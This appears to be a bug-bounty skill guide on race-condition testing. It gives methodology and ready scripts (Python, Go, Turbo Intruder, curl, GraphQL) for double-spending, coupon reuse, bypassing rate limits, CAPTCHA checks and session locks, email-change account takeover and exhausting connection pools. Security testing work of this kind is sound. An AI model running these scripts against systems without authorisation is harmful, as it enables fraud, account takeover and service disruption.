---
name: "race-condition-testing"
version: "2.0"
category: "logic"
subcategory: "race-condition"
phase: "exploitation"
tags: ["bug-bounty", "concurrency", "injection", "logic", "race-condition", "toctou", "access-control", "account-takeover", "api", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["turbo-intruder", "burp-repeater", "python", "curl", "go", "adb", "burp", "ghauri", "sqlmap", "racepht", "aiohttp", "arjun", "authz", "autorize", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["authorization-session-testing", "exploitation-chaining"]
description: "Bug bounty skill: race condition testing - exploitation phase, logic category"
---
# Race Conditions (TOCTOU)

## Summary

Race conditions occur when the behavior of a system depends on the relative timing or sequence of events that can happen in different orders. In web application security, race conditions happen when multiple concurrent processes or threads access and manipulate the same resource simultaneously without proper synchronization. A race condition becomes a security vulnerability when it affects security controls or business logic — enabling double spending, rate limit bypass, coupon reuse, MFA bypass, and privilege escalation.

## Key Concepts

- **TOCTOU (Time-of-Check to Time-of-Use)**: A check is performed, but circumstances change before the result of the check is used
- **Read-Modify-Write**: Multiple processes read, modify, and write back a shared resource without coordination
- **Single-Packet Attack**: HTTP/2 multiplexing or HTTP/3 streams achieve micro-second concurrency for race testing
- **Last-Byte-Sync**: HTTP/1.1 technique — open multiple connections, send almost-complete requests, flush final bytes simultaneously
- **Session Lock Bypass**: PHP session locking prevents concurrent requests from the same session — bypass by using multiple unique session IDs
- **Idempotency**: APIs designed to be safely retried (with idempotency keys) prevent race-induced duplicate operations

## Technical Details

### Race Condition Types

- **Financial Systems**: Double withdrawal, transaction rollback abuse, balance check bypass
- **Account & Authentication**: Multiple account creation with same unique identifier, token reuse, MFA bypass, session fixation race
- **Resource Management**: Upload-download race (access before validation), resource over-allocation, temporary file races
- **Application-Specific**: Shopping cart discount windows, auction sniping, reservation double-booking
- **Rate Limiting / Anti-Automation**: OTP/reset code reuse, CAPTCHA reuse, global vs per-user vs per-IP bucket races

### Common Vulnerable Scenarios

- Account balance manipulation — concurrent withdrawals/transfers
- Coupon/promotion code reuse — single-use code used multiple times
- File upload processing — upload and access before validation completes
- Registration processes — creating multiple accounts with the same unique identifier
- Token verification — using authentication tokens multiple times before invalidation
- Email change race — racing email change between attacker and victim addresses for account takeover
- Multi-step transactions — racing the final confirmation step (e.g., 20 simultaneous "confirm order" requests)

### Database Isolation Levels

Different isolation levels handle concurrency differently:

**PostgreSQL:**
```sql
-- READ COMMITTED (default) — prone to races
BEGIN TRANSACTION ISOLATION LEVEL READ COMMITTED;
SELECT balance FROM accounts WHERE id = 123;
-- Race window here
UPDATE accounts SET balance = balance - 100 WHERE id = 123;
COMMIT;

-- REPEATABLE READ — prevents some races
BEGIN TRANSACTION ISOLATION LEVEL REPEATABLE READ;

-- SERIALIZABLE — strongest protection
BEGIN TRANSACTION ISOLATION LEVEL SERIALIZABLE;
```

**Explicit locking:**
```sql
SELECT * FROM table FOR UPDATE;    -- Row-level lock
LOCK TABLE table IN EXCLUSIVE MODE; -- Table-level lock
SELECT pg_try_advisory_lock(12345); -- PostgreSQL advisory locks
```

### WebSocket Race Conditions

Persistent connections can be vulnerable:

```javascript
const ws = new WebSocket("wss://target.com/socket");
ws.onopen = () => {
  for (let i = 0; i < 50; i++) {
    ws.send(JSON.stringify({action: "transfer", amount: 100, to: "attacker"}));
  }
};
```

### Cloud & Serverless Races

- **AWS Lambda**: Test concurrent invocations exceeding reserved concurrency; check DynamoDB conditional write usage (`ConditionExpression` with `Attr('used').eq(False)`)
- **GCP Cloud Functions**: Test HTTP-triggered functions with parallel curl requests
- **Azure Functions**: Check if `[Singleton]` attribute is used to prevent concurrent execution
- **Serverless functions** may process the same event in parallel — mitigate with idempotency keys or reserved-concurrency settings

### Protocol-Specific Primitives

- **HTTP/2 Single-Packet Attack**: ≤4 µs request skew (PortSwigger BH 2023), supported in Burp Repeater and Turbo Intruder
- **HTTP/1.1 Last-Byte-Sync**: Send near-complete requests on multiple connections, flush final bytes simultaneously
- **GraphQL batch mutations**: Replay a single POST body with 20 identical mutations to test for duplicated state changes
- **gRPC**: Open multiple concurrent `SendMsg` frames before backend commits state

## Methodology

1. **Map state-changing operations** — Identify all endpoints handling financial transactions, inventory, coupons/points, voting/ratings, membership actions, registration, resource management, and rate-limited actions. Create multiple test accounts.

2. **Set up race testing tools** — Burp Suite Turbo Intruder or Repeater (2023.9+, `Send group in parallel (single-packet attack)`), custom Python/Go threading scripts, or Racepht.

3. **Perform baseline analysis** — Document normal request/response flow for each target operation. Understand single-request behavior before testing concurrency.

4. **Send parallel requests** — Fire 10–100 simultaneous identical requests at state-changing endpoints. Use synchronized threading (gate release pattern) or single-packet attack for µs-level concurrency.

5. **Observe anomalies** — Check for duplicate state changes, inconsistent balances, multiple coupon redemptions, identical reset tokens, or responses indicating the operation succeeded more times than allowed.

6. **Bypass session locks** — If the application locks sessions (PHP `session_start()`), authenticate multiple times to obtain different session IDs and assign one to each concurrent request.

7. **Test multi-step transactions** — For flows with multiple requests (add to cart → checkout), send the final state-changing step (e.g., confirm order) in parallel while the earlier steps complete normally.

8. **Test rate-limit and CAPTCHA races** — Send concurrent login or OTP requests across multiple sessions/IPs to probe shared counters. Look for global vs per-user vs per-IP buckets; test burst vs sustained patterns.

9. **Test protocol-specific vectors** — GraphQL batch mutations (20 identical mutations in one POST), WebSocket message floods, gRPC concurrent frames, serverless concurrent invocations.

10. **Exploit and document** — Fine-tune timing and concurrency parameters, create reproducible PoC, document financial/privacy/security impact.

## Detection Commands

### Python — Synchronized Threading

```python
import requests, threading, time

start_gate = threading.Event()

def race():
    start_gate.wait()
    requests.post('https://target.com/api/redeem',
                  json={'coupon_code': 'ONCE123'},
                  headers={'Authorization': 'Bearer token'})

threads = [threading.Thread(target=race) for _ in range(50)]
for t in threads:
    t.daemon = True
    t.start()
time.sleep(2)
start_gate.set()
```

### Python asyncio

```python
import asyncio, aiohttp

async def race(session):
    async with session.post('https://target.com/api/action', data={'param': 'value'}) as r:
        return await r.text()

async def main():
    async with aiohttp.ClientSession() as s:
        responses = await asyncio.gather(*[race(s) for _ in range(50)])
```

### Go

```go
var wg sync.WaitGroup
for i := 0; i < 50; i++ {
    wg.Add(1)
    go func() {
        http.Post("https://target.com/api/action", "application/json",
                  strings.NewReader(`{"param":"value"}`))
        wg.Done()
    }()
}
wg.Wait()
```

### Turbo Intruder — Single-Packet Attack

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                         concurrentConnections=1,
                         engine=Engine.BURP2)

    for _ in range(20):
        engine.queue(target.req, gate='race')

    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

### Turbo Intruder — Rate Limit Testing

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                         concurrentConnections=1,
                         engine=Engine.BURP2)
    passwords = wordlists.clipboard
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    engine.openGate('1')
```

### Turbo Intruder — File Upload Race (Upload-then-Access)

Custom upload implementations may write files to the final location *before* validation completes, deleting them only if the check fails. Race a POST (upload) against repeated GETs (access) to grab the file during the vulnerable window. Also applicable to URL-based uploads where the server fetches a file and saves it before validating:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)
    request1 = '''<YOUR-POST-REQUEST>'''   # file upload request
    request2 = '''<YOUR-GET-REQUEST>'''    # request for the uploaded file
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

**Context**: Modern frameworks are protected (temp sandboxed dir → randomized names → move after validation). Custom implementations are vulnerable when files are written directly to the final location and removed on failure — and brute-forceable when pseudo-random directory names use weak generators like `uniqid()`.

### WebSocket Race — Multiple Simultaneous Handshakes

```bash
for i in {1..20}; do
  curl -i -N \
    -H "Connection: Upgrade" \
    -H "Upgrade: websocket" \
    -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
    -H "Sec-WebSocket-Version: 13" \
    https://target.com/socket &
done
wait
```

### Cloud — Lambda Concurrent Invocation

```python
import boto3, concurrent.futures

lambda_client = boto3.client('lambda')
def invoke():
    return lambda_client.invoke(
        FunctionName='vulnerable-function',
        InvocationType='RequestResponse',
        Payload='{"action": "redeem_coupon", "code": "SAVE50"}'
    )

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    futures = [ex.submit(invoke) for _ in range(50)]
    results = [f.result() for f in futures]
```

## Exploitation Payloads

### Double-Withdrawal / Double-Spend

Send 10–50 identical withdrawal/transfer requests simultaneously. If the backend checks balance after reading but before writing, each request may see the original balance and succeed.

### Coupon Reuse

Fire the coupon redemption endpoint in parallel. If there's a read-modify-window between checking `used=false` and setting `used=true`, multiple redemptions succeed.

### Email Change Race (ATO)

Setup: Account A (attacker@evil.com) and Account B (victim@legit.com). Send parallel email change requests swapping between the two addresses. If confirmation links are generated simultaneously, both may land in one inbox, enabling account takeover.

### Multi-Step E-commerce Race

```
/product  →  /cart  →  /cart/checkout  (send 20 checkout requests in parallel)
```

### GraphQL Batch Mutation

```graphql
POST /graphql
[
  {"query": "mutation { redeemCoupon(code: \"SAVE50\") { success } }"},
  {"query": "mutation { redeemCoupon(code: \"SAVE50\") { success } }"},
  ... 18 more identical mutations ...
]
```

## Commands

### AWS DynamoDB Conditional Write Test

```python
import boto3
from boto3.dynamodb.conditions import Attr

dynamodb = boto3.resource('dynamodb')
table = dynamodb.Table('coupons')

def redeem_coupon():
    table.update_item(
        Key={'code': 'SAVE50'},
        UpdateExpression='SET used = :val',
        ConditionExpression=Attr('used').eq(False),
        ExpressionAttributeValues={':val': True}
    )
```

### PostgreSQL Lock Monitoring

```sql
SELECT * FROM pg_locks WHERE locktype = 'advisory';
```

### Connection Pool Exhaustion Test

```python
import requests, threading, time

def hold():
    r = requests.get('https://target.com/long-running-query', stream=True)
    time.sleep(30)

threads = [threading.Thread(target=hold) for _ in range(100)]
for t in threads:
    t.start()
time.sleep(2)
# Now test critical operations — race conditions may appear during pool exhaustion
```

## Tools

- **Burp Turbo Intruder** — High-volume parallel request engine with gate/race primitives
- **Burp Repeater (2023.9+)** — Send group in parallel (single-packet attack)
- **Racepht** — Purpose-built race condition testing framework
- **Race-the-Web** — Web application race condition finder
- **Raceocat** — CLI scanner using raw-socket requests for µs-precision
- **URL-Race-Condition-Scanner** — Generates and races endpoints from Burp history
- **OWASP ZAP** — With parallel request scripts
- **Custom**: Python threading/asyncio, Go goroutines

## Bypass Techniques

- **Session Lock Bypass**: PHP session locking blocks concurrent requests from the same session. Authenticate multiple times to obtain unique `PHPSESSID` values and assign one per thread.
- **Rate Limit Races**: Test global vs per-user vs per-IP rate limit buckets with burst traffic.
- **CAPTCHA Reuse**: Send concurrent requests sharing the same CAPTCHA token — if validation doesn't consume the token atomically, multiple requests may pass.
- **Database Isolation Downgrade**: If the application uses `READ COMMITTED`, try to trigger `REPEATABLE READ` or `SERIALIZABLE` failures to identify race windows.
- **Connection Pool Exhaustion**: Hold connections open (long-running queries, streaming responses) to exhaust the pool, then race operations during queue processing.

## Not a Finding If

- **Application uses SERIALIZABLE isolation** — Strongest protection against race conditions.
- **Idempotency keys are enforced** — APIs with properly validated `Idempotency-Key` headers prevent duplicate operations.
- **Atomic UPSERT / ON CONFLICT statements** — Database-level write-once semantics prevent double-spending.
- **Session locking prevents concurrency** — Single session ID cannot execute parallel requests (bypassable with multiple sessions).
- **Lambda reserved concurrency = 1** — Only one concurrent invocation, no race possible.
- **Azure Functions `[Singleton]` attribute** — Prevents concurrent execution.
- **Request-level mutex** — Application explicitly locks resources per-request (e.g., Redis Redlock, PostgreSQL advisory locks).

## Notes

- Always set up monitoring (CloudWatch ConcurrentExecutions, pg_locks, connection pool metrics) to observe race effects.
- Network proximity matters — use a VPS in the same region/provider as the target for tighter timing.
- Single-packet attack via HTTP/2 (≤4 µs skew) is dramatically more effective than threaded HTTP/1.1 requests.
- GraphQL batch mutations bypass conventional CSRF and rate-limit controls — always test them as a race vector.
- For maximum reliability, combine single-packet attack with multiple session IDs and synchronized thread gates.
- PortSwigger released a white-paper *Smashing the State Machine* (Black Hat 2023) with the single-packet attack methodology.
- OWASP ASVS v5 (2024) section 7.6 covers concurrency controls.

## References

- https://portswigger.net/web-security/race-conditions
- https://portswigger.net/research/smashing-the-state-machine
- https://github.com/portswigger/turbo-intruder
- https://owasp.org/www-project-application-security-verification-standard/
